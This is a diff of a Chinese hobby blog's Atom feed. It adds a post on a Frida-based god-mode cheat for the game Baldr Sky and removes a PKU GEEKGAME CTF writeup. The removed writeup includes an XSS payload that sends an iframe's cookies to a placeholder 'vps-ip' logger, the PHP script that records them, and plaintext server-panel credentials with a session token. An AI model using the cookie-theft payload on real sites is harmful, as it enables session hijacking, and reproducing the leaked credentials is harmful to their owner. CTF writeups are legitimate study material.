@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-05-22T07:44:49.031Z</updated>
+  <updated>2025-06-04T13:48:59.657Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Baldr Sky Dive1+2 插件Jbsd Ver1.0.0发布</title>
+    <link href="http://example.com/2025/06/04/Baldr%20Sky%20Dive1+2%20%E6%8F%92%E4%BB%B6Jbsd%20Ver1.0.0%E5%8F%91%E5%B8%83/"/>
+    <id>http://example.com/2025/06/04/Baldr%20Sky%20Dive1+2%20%E6%8F%92%E4%BB%B6Jbsd%20Ver1.0.0%E5%8F%91%E5%B8%83/</id>
+    <published>2025-06-04T12:00:00.000Z</published>
+    <updated>2025-06-04T13:48:59.657Z</updated>
+    
+    <content type="html"><![CDATA[<style>  /* 设置整个页面的字体 */  html, body, .markdown-body {    font-weight: 600;  }</style><h1 id="Baldr-Sky-Dive1-2-插件Jbsd-Ver1-0-0发布"><a href="#Baldr-Sky-Dive1-2-插件Jbsd-Ver1-0-0发布" class="headerlink" title="Baldr Sky Dive1+2 插件Jbsd Ver1.0.0发布"></a>Baldr Sky Dive1+2 插件Jbsd Ver1.0.0发布</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>众所周知 巴德尔之空（Baldr Sky）是一部戏画在2009年发售的少女恋爱游戏</p><p>作为巴德尔系列的传统 那我们机甲战斗这块肯定少不了</p><p>但是想必很多人和博主一样 是一个手残党 或者说并没有那么多时间去研究combo连招 只是想单纯地看看剧情</p><p>对于2025年的人来说 毕竟是处在这样一个快节奏、快餐化的时代 时不时插入的动辄花费不少时间的战斗 属实是有点影响体验感（这里叠个甲 当然喜欢这种战斗并带入的玩家也不在少数 奈何博主是个剧情党）</p><p>因此 博主就想写一点小工具 优化一下战斗体验 所以一个十分简单的小外挂应运而生了</p><h2 id="分析（可跳过）"><a href="#分析（可跳过）" class="headerlink" title="分析（可跳过）"></a>分析（可跳过）</h2><p>首先感谢逆向大师doctor3的帮助</p><h3 id="All-in-all"><a href="#All-in-all" class="headerlink" title="All in all"></a>All in all</h3><p>本工具使用<code>Python-frida &amp;&amp; Javascript</code>实现某地址指令的hook 并更换处理逻辑</p><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>把BaldrSky.exe拖入CheatEngine（或者IDA）</p><p>打开Memory Viewer</p><p>准确定位到BaldrSky.exe+158D71 如下图</p><p><img src="/img/bsd/ce.png" alt="ce"><br>可以选中当前地址 按F5打个断点</p><p>然后进游戏随便找一个设置菜单 进练习里攻击一下假人 发现断点生效</p><p>那这里实际上就是每个机体受到伤害时减少血量的逻辑</p><p><code>sub [esi+00001564],edi</code></p><p>当我们把这个edi调成很大很大的值 然后恢复断点继续运行 发现练习的假人直接被我们秒杀了</p><p>然而这并非敌人受到伤害扣血的逻辑 而是所有机体（除某些剧情机体）受到伤害扣血的逻辑</p><p>每个机体的esi不同 所以他们<code>[esi+00001564]</code>这个地址的值也不同</p><p>所以说盲目的修改edi会导致主角也被秒杀 所以在这里我们需要引入一个判断 然后对不同的机<br>体实现不同的逻辑</p><p>那么我这里用的是比较简易的<code>frida</code>和<code>javascript</code></p><p>先通过前期调试打印 发现主角机体的血量初始为1000（关闭所有增加血量的插件）</p><p>因此我们可以做这样一个逻辑</p><ol><li>在<code>BaldrSky.exe+158D71</code>这个地址上进行hook</li><li>检测<code>[esi+00001564]</code>这个地址的值是否为1000</li><li>若为1000 则将edi修改为0 保持原逻辑继续运行</li><li>若不为1000 则将edi*100 保持原逻辑运行</li></ol><p>然后我们便得到了一个简单的主角无敌 敌人脆皮的小外挂</p><p>当然这个插件的bug很多 比如这个游戏有友方机体共同作战的场景 而友方机体血量也都不为1000 那么友方机体受到伤害时 也是个脆皮 而战斗基本上都要求友方也不能战死 所以得尽全力保护友方机体</p><p>但是由于我比较懒 而且全GE通关下来 我可以保证不超过3处是需要切换难度或者关闭外挂才能通过的关卡 所以还算勉强能用 就不深入研究了</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>Jbsd仅使用血量是否为1000判断是否是主角机体 只有当血量为1000才有无敌 否则会造成大量伤害 因此请关闭<font color=red>机能扩张</font>中所有增加血量的插件 同时如果碰到敌方机体血量也为1000时请关闭Jbsd（情况比较少数，例：记忆溯行中基本所有的机体）</li><li>由于第1点的限制 所有友方机体血量都不为1000 若是碰到与友方机体共同战斗的场景 尽量尽快解决战斗 不然<font color=red>友方机体很可能也被敌方机体秒杀</font>（实测使用轻机枪基本所有场景都可以保护住友方机体）</li><li>根据第2点 在战斗中可能会出现三种情况<ul><li>队友战死 战斗失败 可选择Retry</li><li>队友战死 但是战斗正常结算 点击Close后闪退（这时重开插件和游戏即可）</li><li>队友战死 战斗正常结算 点击Close后继续剧情（这一般是死掉的队友不是主要人物 因此无伤大雅 或者在此处没有检测队友是死是活）</li></ul></li><li>本插件并<font color=red>未实现无限热量</font>的功能 因此最好使用轻机枪等射速快耗热量少的武器 在某些情况下保护队友可能比较困难 建议修改难度为VeryEasy后再次战斗</li><li>仅发布在Github上 插件的使用请遵照Github的README</li></ol><h2 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h2><p><a href="https://github.com/Jednersaous1/Jbsd">发布地址 点我点我</a></p><details>    <summary>小剧透警告</summary>    什么！打不过吉鲁贝鲁特？打不过久利原老师？打不过千夏？打不过真酱？（这是真打不过）打不过镇静剂？打不过十九？<br>    什么！我是个纯爱战士！蕾被看光自爆那种事不要啊！菜叶被RAPE那种事不要啊！千夏被RAPE那种事...好像也不是不能接受<br>    大丈夫大丈夫 本外桂带给你超人一般的体验 吉鲁贝鲁特？真女主跪下！ 久利原老师？跪下！ 千夏？跪下！ 真酱？可爱捏！ 镇静剂？跪下！ 十九？给我这个恋母控的超级大脑AI看笑了<br>    装上手枪和轻机枪 直接化身John Wick 一枪一个不是梦</details>]]></content>
+    
+    
+    <summary type="html">BSD小插件</summary>
+    
+    
+    
+    
+    <category term="Galgame" scheme="http://example.com/tags/Galgame/"/>
+    
+    <category term="Tools" scheme="http://example.com/tags/Tools/"/>
+    
+  </entry>
   
   <entry>
     <title>パソコン维修日记</title>
@@ -54,11 +75,11 @@
     
     
     
+    <category term="Tools" scheme="http://example.com/tags/Tools/"/>
+    
     <category term="Manga" scheme="http://example.com/tags/Manga/"/>
     
     <category term="Crawler" scheme="http://example.com/tags/Crawler/"/>
-    
-    <category term="Tools" scheme="http://example.com/tags/Tools/"/>
     
   </entry>
   
@@ -102,9 +123,9 @@
     
     <category term="Java" scheme="http://example.com/tags/Java/"/>
     
-    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
-    
     <category term="RMI" scheme="http://example.com/tags/RMI/"/>
+    
+    <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
     
   </entry>
   
@@ -125,9 +146,9 @@
     
     <category term="Java" scheme="http://example.com/tags/Java/"/>
     
-    <category term="FastJson" scheme="http://example.com/tags/FastJson/"/>
-    
     <category term="反序列化" scheme="http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
+    
+    <category term="FastJson" scheme="http://example.com/tags/FastJson/"/>
     
   </entry>
   
@@ -417,27 +438,6 @@
     
     
     <summary type="html">Writeup for NewstarCTF2023</summary>
-    
-    
-    
-    
-    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
-    
-    <category term="writeup" scheme="http://example.com/tags/writeup/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PKU GEEKGAME Writeup</title>
-    <link href="http://example.com/2023/11/13/PKU%20GEEKGAME/"/>
-    <id>http://example.com/2023/11/13/PKU%20GEEKGAME/</id>
-    <published>2023-11-13T02:00:00.000Z</published>
-    <updated>2025-04-15T08:50:17.882Z</updated>
-    
-    <content type="html"><![CDATA[<style>  /* 设置整个页面的字体 */  html, body, .markdown-body {    font-weight: 600;  }</style><h1 id="PKU-GEEKGAME"><a href="#PKU-GEEKGAME" class="headerlink" title="PKU GEEKGAME"></a>PKU GEEKGAME</h1><h2 id="1-第三新XSS"><a href="#1-第三新XSS" class="headerlink" title="1.第三新XSS"></a>1.第三新XSS</h2><p>首先要和内网交互，所以公网应该是少不了的，这次嫖华为云去了（）</p><p>一开始我用nginx搭了个默认页面，但是解析不了php（即访问php文件就自动下载源文件），配环境难如登天，纯用JS也要appendChild什么的，再者还有还有限制，在后面细说</p><p>后来我就尝试nc监听，让网页发送GET请求，但是document.cookie一直读的是空，就算用XSS Bot执行payload也是读的空，我就有点没太搞明白，查了查资料，问了问chatgpt说是有这几种可能</p><p>1.HttpOnly&#x3D;True</p><p>2.Secure Cookie</p><p>3.不同域读取？（</p><p>4.SameSite（这个是真没听过）<br>结合了下题干，红字是<strong>所有人共享一个网站</strong>，所以可能是SameSite？？？</p><p>总之在纯净nginx碰壁之后，我把纯净centOS换成宝塔了，还是懒人适合我（</p><blockquote><p>外网面板地址: <a href="https://121.36.15.50:18059/c8f3f7ae">https://121.36.15.50:18059/c8f3f7ae</a><br> 内网面板地址: <a href="https://192.168.0.249:18059/c8f3f7ae">https://192.168.0.249:18059/c8f3f7ae</a><br> username: ihij0ih3<br> password: 95c36d63</p></blockquote><p>上面这个是秘密（到时候给删了，做题先留着</p><p>希望宝塔的打包环境能来点作用，最近CTF比赛有点多，我好想实践一下docker，但是老是没有时间</p><p>background knowledge:</p><p><strong>cookie的SameSite属性</strong></p><p>1.Strict      完全禁止第三方Cookie，跨站点时，任何情况都不会发送Cookie</p><p>2.Lax         少数情况发送第三方Cookie，详见下图</p><p>3.None        始终发送第三方Cookie</p><p>用宝塔也试了一下document.cookie，果然还是不行</p><p>我看StackOverflow上说读不到就是HttpOnly，应该不是SameSite的问题了</p><p>————————————————分割线——————————————————</p><p>唉，有点想缴械投降了，确实脑洞不够大，很多东西都是一知半解，或者说是根本不懂</p><p>javascript也没想象中那么了解，更有新的typescript，XSS也是根本一点也不懂</p><p>给我的挫败感有点强了，虽然其实我自己确实是懒，脚本不想写，总想着小聪明</p><p>唉，什么时候才能改掉这个不爱写脚本的坏习惯呢，我连怎么http发送请求都还不熟悉</p><p>唉，唉，唉</p><p><strong>第二阶段咯，有hint了我终于不用坐牢啦哈哈哈</strong></p><p><strong>好玩好玩，好玩好玩，好玩好玩，好玩好玩，好玩好玩，太好玩啦哈哈哈哈哈哈</strong></p><p><strong>Level 1</strong></p><blockquote><p>参考MCN:</p><p><a href="https://developer.mozilla.org/en-US/docs/web/api/document/cookie#security">https://developer.mozilla.org/en-US/docs/web/api/document/cookie#security</a></p><p>参考blog:</p><p><a href="https://juejin.cn/post/7127916577684471845">https://juejin.cn/post/7127916577684471845</a></p></blockquote><p>咳咳，回归正题，XSS.py里原来设置了Cookie的path，导致不同目录不能读到Cookie，</p><p>得用iframe+contentDocument.cookie，因为iframe算是独立的一个窗口，与另一个目录通信</p><p>注意一点，得先iframe.onload&#x3D;function(){  }，才能读到iframe里的数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">payload</span>:<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://prob99-ch243r4h.geekgame.pku.edu.cn/admin&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">var</span> iframe = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&#x27;iframe&#x27;</span>)[<span class="hljs-number">0</span>];</span></span><br><span class="language-javascript"><span class="language-xml">iframe.<span class="hljs-property">onload</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;&lt;img src=&quot;http://vps-ip/getcookie.php?cookie=&#x27;</span>+iframe.<span class="hljs-property">contentDocument</span>.<span class="hljs-property">cookie</span>+<span class="hljs-string">&#x27;&quot;width=0 height=0&gt;&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">getcookie.php:<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cookie&#x27;</span>];<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getenv</span> (<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>);<br><span class="hljs-variable">$time</span> = <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Y-m-d g:i:s&#x27;</span>);<br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;cookie.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&quot;IP: &quot;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;Date: &quot;</span>.<span class="hljs-variable">$time</span>.<span class="hljs-string">&quot; Cookie:&quot;</span>.<span class="hljs-variable">$cookie</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果没有vps的话，修改当前目录下的<strong>title</strong>应该也是可以的</p><p><strong>Level 2</strong></p><p>…未完待续</p><h2 id="2-Emoji-Wordle"><a href="#2-Emoji-Wordle" class="headerlink" title="2.Emoji Wordle"></a>2.Emoji Wordle</h2><p>顾名思义，就是emoji外国猜字谜，先介绍一下规则</p><p>输入n个emoji符号，会返回n个三种颜色的方块</p><p>1.若返回红色方块，说明对应位置的emoji不存在于答案中</p><p>2.若返回黄色方块，说明对应位置的emoji在答案中，但是位置错误</p><p>3.若返回绿色方块，说明对应位置的emoji在答案中，且位置正确</p><p><strong>Level 1</strong></p><p>简单看了下源码，改了results和localStorage，发现无果，说明没有检查这些鸟玩意</p><p>把Cookie拿去解析了下，就只有level和时间戳，改level无果，时间戳干嘛用不知道（</p><p>题目说答案是固定的，所以就直接爆破了，以下是python源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;https://prob14.geekgame.pku.edu.cn/level3?&quot;</span><br>headers=&#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;</span><br>&#125;<br>param = &#123;<br>    <span class="hljs-string">&#x27;guess&#x27;</span>: <span class="hljs-string">&quot;?123&quot;</span><br>&#125;<br>cookie_d=&#123;<br>    <span class="hljs-string">&#x27;PLAY_SESSION&#x27;</span>:<span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7ImxldmVsIjoiMyIsInN0YXJ0X3RpbWUiOiIxNjk3NjI3MzAyNjc5IiwicmVtYWluaW5nX2d1ZXNzZXMiOiIyIiwic2VlZCI6IjEuMjQ2MTQ1ODQxMjk2MzFFMTIifSwibmJmIjoxNjk3NjI3MzA3LCJpYXQiOjE2OTc2MjczMDd9.eMLRy1PQPp-kkJUaWVz_bDk5CkGcM_D8DIqOqB_TGcM&quot;</span><br>&#125;<br>res = requests.get(url=url,params=param, headers=headers,cookies=cookie_d)<br>res.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>text = res.text<br>pattern=<span class="hljs-string">r&#x27;&lt;input name=guess placeholder=&quot;(.*?)&quot;&gt;&#x27;</span><br><span class="hljs-comment"># patternt=r&#x27;results.push(&quot;(.*?)&quot;)&#x27;</span><br>matching=re.search(pattern,text)<br><span class="hljs-comment"># matchingt=re.search(patternt,text)</span><br><span class="hljs-built_in">print</span>(text)<br>emoji=matching.group(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(emoji)<br><span class="hljs-comment"># result=matchingt.group()</span><br><span class="hljs-built_in">print</span>(text[<span class="hljs-number">516</span>:<span class="hljs-number">580</span>])<br>count=<span class="hljs-number">0</span><br>green=<span class="hljs-string">&#x27;🟩&#x27;</span><br>list1=[<span class="hljs-string">&#x27;0&#x27;</span>]*<span class="hljs-number">64</span><br>emojilist=[]<br><span class="hljs-keyword">while</span> <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">in</span> list1:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>        <span class="hljs-keyword">if</span> emoji[i] <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> emojilist:<br>            emojilist.append(emoji[i])<br>            s=emoji[i]*<span class="hljs-number">64</span><br>            param=&#123;<span class="hljs-string">&#x27;guess&#x27;</span>: s&#125;<br>            rest = requests.get(url=url, params=param, headers=headers, cookies=cookie_d)<br>            rest.encoding=<span class="hljs-string">&quot;utf-8&quot;</span><br>            textt = rest.text<br>            temp=textt[<span class="hljs-number">516</span>:<span class="hljs-number">580</span>]<br>            count=count+<span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(count, temp)<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>                <span class="hljs-keyword">if</span> temp[j]==green:<br>                    list1[j]=emoji[i]<br>    emoji=re.search(pattern,textt).group(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(list1)<br></code></pre></td></tr></table></figure><p>如果要复现，可能得改下Cookie（真能复现嘛…）</p><p>返回的方块我用我仅可能有的一点正则表达式的知识也没截取到</p><p>但是emoji我都能截到，这到底是什么问题呢？？？</p><p><strong>Level 2</strong></p><p>非常没有含金量的一题</p><p>直接把Cookie拿去jwt解析就好了，target的值就是答案，一输，flag就有了</p><p><strong>Level 3</strong></p><p>…未完待续</p>]]></content>
-    
-    
-    <summary type="html">Writeup for geekgame</summary>
     
     
     
